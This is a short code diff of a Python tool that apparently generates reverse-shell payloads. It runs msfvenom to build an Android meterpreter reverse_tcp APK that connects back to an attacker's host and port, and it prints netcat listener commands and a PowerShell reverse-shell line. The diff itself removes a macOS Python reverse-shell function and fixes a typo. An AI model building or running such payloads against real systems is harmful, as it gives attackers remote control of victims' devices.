@@ -35,10 +35,6 @@ def tcppydll():
 def tcpapk():
     subprocess.call(['msfvenom','-p','android/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'-f','raw','-o',o+'.apk'])
 
-#MACOS REV SHELLS
-def macpy1():
-    print("Create a listener: nc -lnvp", lport,"\n python rev shell saved as",o+"py")
-
 #Powershell Script by antonioCoco.
 def pscoco():
     print("Create a listener: nc -lnvp", lport,"\nExecute in windows poweshell:\n",cocofile+lhost,lport+virgolette)
@@ -238,6 +234,6 @@ if os == '3':
             py2.write(macpy2)
         print("\nSUCCESS! File saved as",o+".py")
     else:
-        pritn("\n[!] ERROR! Try again!")
+        print("\n[!] ERROR! Try again!")
 
 print("\nBye bye ;)")
